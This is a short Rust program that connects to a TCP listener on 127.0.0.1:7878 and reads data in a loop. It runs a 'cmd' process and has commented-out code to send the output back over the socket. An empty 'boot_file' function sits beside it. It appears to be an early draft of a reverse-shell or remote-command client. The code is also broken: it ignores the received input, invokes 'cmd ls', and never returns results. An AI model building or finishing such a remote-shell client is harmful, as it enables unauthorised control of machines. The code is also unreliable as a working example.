use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};
use std::process::Command;

//V
fn main() {
    server_connect();
}

pub fn server_connect() {
	let mut stream = TcpStream::connect("127.0.0.1:7878").unwrap();
	
	loop {
	
		let mut buffer = [0; 1024];
		
		stream.read(&mut buffer).unwrap();
		let mut input = String::from_utf8_lossy(&buffer[..]).trim().to_string();

		println!("{}", input);

		let mut output = Command::new("cmd")
			.arg("ls")
			.output()
			.expect("No");

		//stream.write_all(&output.stdout);
		//println!("no");
	}
}

pub fn boot_file() {

}
